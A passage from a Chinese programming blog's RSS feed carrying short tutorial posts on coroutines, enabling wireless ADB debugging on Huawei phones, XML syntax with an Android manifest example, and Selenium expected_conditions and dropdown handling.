&lt;li&gt;进程：管道， 信号量， 信号， 消息队列， 共享内存， 套接字&lt;/li&gt;
&lt;li&gt;线程：锁机制（互斥锁、条件变量、读写锁），信号量机制(Semaphore)，信号机制(Signal)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4什么是协程&#34;&gt;4.什么是协程&lt;/h2&gt;
&lt;p&gt;协程(Coroutine)，又称微线程，纤程，是&lt;strong&gt;单线程语言中用来模拟多线程&lt;/strong&gt;的一种方式。协程的作用，是在执行部分耗时长的函数时，可以先中断执行，去处理其他耗时短的函数，等到空闲时再继续执行该耗时长的函数，最终使得这一整个过程看上去像多线程。&lt;/p&gt;
&lt;h2 id=&#34;5协程优势&#34;&gt;5.协程优势&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;执行效率极高，因为子程序切换(函数)不是线程切换，仅仅是函数的切换，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。&lt;/li&gt;
&lt;li&gt;不需要多线程的锁机制，因为是单线程，所以不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Android—华为设备启动无线调试</title>
        <link>https://ac-lm.github.io/posts/android/android%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%90%AF%E5%8A%A8%E6%97%A0%E7%BA%BF%E8%B0%83%E8%AF%95/</link>
        <pubDate>Tue, 03 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/android/android%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E5%90%AF%E5%8A%A8%E6%97%A0%E7%BA%BF%E8%B0%83%E8%AF%95/</guid>
        <description>&lt;p&gt;华为默认不启动无线调试，用户需要进入生产模式，手动启动&lt;/p&gt;
&lt;h2 id=&#34;1生产模式的启用&#34;&gt;1.生产模式的启用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;拨号界面中输入&lt;code&gt;*#*#2846579#*#*&lt;/code&gt;，进入工程菜单，将调试模式变更为生产模式&lt;/li&gt;
&lt;li&gt;计算器界面中输入&lt;code&gt;()()2846579()()&lt;/code&gt;，进入工程菜单，将调试模式变更为生产模式&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2启动无线调试功能&#34;&gt;2.启动无线调试功能&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;使用 USB 连接手机，将无线端口开启&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;adb tcpip 5555
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;使用同一网络环境的 Wifi 连接&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;adb connect 手机IP:5555
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;成功后断开USB，此时便可以在 adb 中查看到连接手机&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;adb devices
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—什么是 Xml</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-xml/</link>
        <pubDate>Tue, 03 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-xml/</guid>
        <description>&lt;p&gt;XML 是纯文本格式，在许多方面类似于 HTML。XML 由 XML 元素组成，每个 XML 元素包括一个开始标记 &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; ，一个结束标记 &lt;code&gt;&amp;lt;/&amp;gt;&lt;/code&gt; 以及两个标记之间的内容。标记是对文档存储格式和逻辑结构的描述，可以包括注释、引用、字符数据段、起始标记、结束标记、空元素、文档类型声明 ( DTD ) 和序言。&lt;/p&gt;
&lt;h2 id=&#34;编写规则&#34;&gt;编写规则&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;必须有声明语句，作为 XML 文档的第一句，其格式如下：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;区分大小写&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在XML文档中，大小写是有区别的。A 和 a 是不同的标记。因此注意在写元素时，前后标记的大小写要保持一致。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;XML文档有且只有一个根元素&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;标准格式的 XML 文档有且仅有一个根元素，紧接着声明后面建立，其他元素都是这个根元素的子元素，根元素完全包括文档中其他所有的元素。根元素的起始标记要放在所有其他元素的起始标记之前，根元素的结束标记要放在所有其他元素的结束标记之后。&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;属性值使用引号&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在HTML代码里面，属性值可以加引号，也可以不加。但是XML规定，所有属性值必须加引号，否则将被视为错误。&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;所有的标记必须有相应的结束标记&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在HTML中，标记可以不成对出现，而在XML中，所有标记必须成对出现，有一个开始标记，就必须有一个结束标记，否则将被视为错误。&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;所有的空标记也必须被关闭&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在XML中，规定所有的标记必须有结束标记。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;manifest&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlns:android=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://schemas.android.com/apk/res/android&amp;#34;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;package=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;osg.AndroidExample&amp;#34;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;android:installLocation=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;preferExternal&amp;#34;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;android:versionCode=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
      &lt;span style=&#34;color:#a6e22e&#34;&gt;android:versionName=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-sdk&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:targetSdkVersion=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:minSdkVersion=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;8&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;lt;/uses-sdk&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-feature&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:glEsVersion=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0x00020000&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt; 
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-permission&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.permission.INTERNET&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;application&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:label=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@string/app_name&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:icon=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@drawable/osg&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;activity&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.osgViewer&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:label=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;@string/app_name&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:screenOrientation=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;landscape&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 
            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;intent-filter&amp;gt;&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;action&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
                &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;category&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.intent.category.LAUNCHER&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
            &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/intent-filter&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/activity&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/application&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/manifest&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;manifest&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;uses-sdk&amp;gt;&lt;/span&gt;69&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/uses-sdk&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;application&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;intent-filter&amp;gt;&lt;/span&gt;85&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/intent-filter&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;activity&amp;gt;&lt;/span&gt;88&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/activity&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/application&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/manifest&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—selenium expected_conditions 的使用</title>
        <link>https://ac-lm.github.io/posts/python/pythonselenium-expected_conditions-%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
        <pubDate>Fri, 30 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonselenium-expected_conditions-%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/nbkhic/p/4885041.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; selenium expected conditions 使用实例  @乙醇 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1supportexpected_conditions&#34;&gt;1.support.expected_conditions&lt;/h2&gt;
&lt;p&gt;Expected Conditions 是 selenium 提供的断言工具，通常使用场景有2种&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接在断言中使用&lt;/li&gt;
&lt;li&gt;与 WebDriverWait 配合使用，动态等待页面上元素出现或者消失&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2方法&#34;&gt;2.方法&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;函数名&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;title_contains&lt;/td&gt;
&lt;td&gt;判断当前页面的 title 是否包含预期字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;title_is&lt;/td&gt;
&lt;td&gt;判断当前页面的 title 是否精确等于预期&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;presence_of_element_located&lt;/td&gt;
&lt;td&gt;判断某个元素是否被加到了 DOM 树里，并不代表该元素一定可见&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;visibility_of_element_located&lt;/td&gt;
&lt;td&gt;判断某个元素是否可见，可见代表元素非隐藏，并且元素的宽和高都不等于 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;presence_of_all_elements_located&lt;/td&gt;
&lt;td&gt;判断是否至少有 1 个元素存在于 DOM 树中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;text_to_be_present_in_element&lt;/td&gt;
&lt;td&gt;判断某个元素中的 text 是否包含了预期的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;text_to_be_present_in_element_value&lt;/td&gt;
&lt;td&gt;判断某个元素中的 value 属性是否包含了预期的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;frame_to_be_available_and_switch_to_it&lt;/td&gt;
&lt;td&gt;判断该 frame 是否可以切换进去，如果可以则返回 True 并切换进去，否则返回 False&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;invisibility_of_element_located&lt;/td&gt;
&lt;td&gt;判断某个元素中是否不存在于 DOM 树或不可见&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element_to_be_clickable&lt;/td&gt;
&lt;td&gt;判断某个元素中是否可见并且是 enable 可操作的&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;staleness_of&lt;/td&gt;
&lt;td&gt;判断某个元素是否从 DOM 树中移除&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element_to_be_selected&lt;/td&gt;
&lt;td&gt;判断某个元素是否被选中了，一般用在下拉列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;element_located_selection_state_to_be&lt;/td&gt;
&lt;td&gt;判断某个元素的选中状态是否符合预期&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;alert_is_present&lt;/td&gt;
&lt;td&gt;判断页面上是否存在 alert&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;3示例&#34;&gt;3.示例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;dr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; webdriver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Chrome()
url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://www.baidu.com&amp;#39;&lt;/span&gt;
search_text_field_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;kw&amp;#39;&lt;/span&gt;
dr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url)

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ECExample&lt;/span&gt;(unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;TestCase):

  &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_title_is&lt;/span&gt;(self):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39; 判断title是否符合预期 &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    title_is_baidu &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EC&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;title_is(&lt;span style=&#34;color:#e6db74&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;百度一下，你就知道&amp;#39;&lt;/span&gt;)
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;assertTrue(title_is_baidu(dr))

  &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_titile_contains&lt;/span&gt;(self):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39; 判断title是否包含预期字符 &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    title_should_contains_baidu &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EC&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;title_contains(&lt;span style=&#34;color:#e6db74&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;百度&amp;#39;&lt;/span&gt;)
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;assertTrue(title_should_contains_baidu(dr))

  &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_presence_of_element_located&lt;/span&gt;(self):
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39; 判断element是否出现在dom树 &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    locator &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (By&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ID, search_text_field_id)
    search_text_field_should_present &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EC&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;visibility_of_element_located(locator)

    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39; 动态等待10s，如果10s内element加载完成则继续执行下面的代码，否则抛出异常 &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
    WebDriverWait(dr, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;until(EC&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;presence_of_element_located(locator))
    WebDriverWait(dr, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;until(EC&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;visibility_of_element_located(locator))

    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;assertTrue(search_text_field_should_present(dr))

  &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_visibility_of&lt;/span&gt;(self):
    search_text_field &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find_element_by_id(search_text_field_id)
    search_text_field_should_visible &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EC&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;visibility_of(search_text_field)
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;assertTrue(search_text_field_should_visible(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yes&amp;#39;&lt;/span&gt;))

  &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_text_to_be_present_in_element&lt;/span&gt;(self):
    text_should_present &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EC&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text_to_be_present_in_element((By&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NAME, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tj_trhao123&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hao123&amp;#39;&lt;/span&gt;)
    self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;assertTrue(text_should_present(dr))
    
  &lt;span style=&#34;color:#a6e22e&#34;&gt;@classmethod&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tearDownClass&lt;/span&gt;(kls):
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;after all test&amp;#39;&lt;/span&gt;
    dr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quit()
    print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;quit dr&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
  unittest&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;main()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—selenium 下拉框( select )的处理</title>
        <link>https://ac-lm.github.io/posts/python/pythonselenium-%E4%B8%8B%E6%8B%89%E6%A1%86-select-%E7%9A%84%E5%A4%84%E7%90%86/</link>
        <pubDate>Thu, 29 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonselenium-%E4%B8%8B%E6%8B%89%E6%A1%86-select-%E7%9A%84%E5%A4%84%E7%90%86/</guid>
        <description>&lt;h2 id=&#34;1select&#34;&gt;1.select&lt;/h2&gt;
&lt;p&gt;在HTML中 &lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt;标签可用于创建单选或多选菜单。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;select&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&amp;gt;AA&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&amp;gt;BB&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&amp;gt;CC&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d&amp;#34;&lt;/span&gt;&amp;gt;DD&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;&amp;gt;EE&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;option&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;select&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2操作&#34;&gt;2.操作&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; selenium.webdriver.support.select &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Select
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;方法&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;select_by_index()&lt;/td&gt;
&lt;td&gt;通过索引定位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;select_by_value()&lt;/td&gt;
&lt;td&gt;通过value值定位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;select_by_visible_text()&lt;/td&gt;
&lt;td&gt;通过文本值定位&lt;/td&gt;
&lt;/tr&gt;
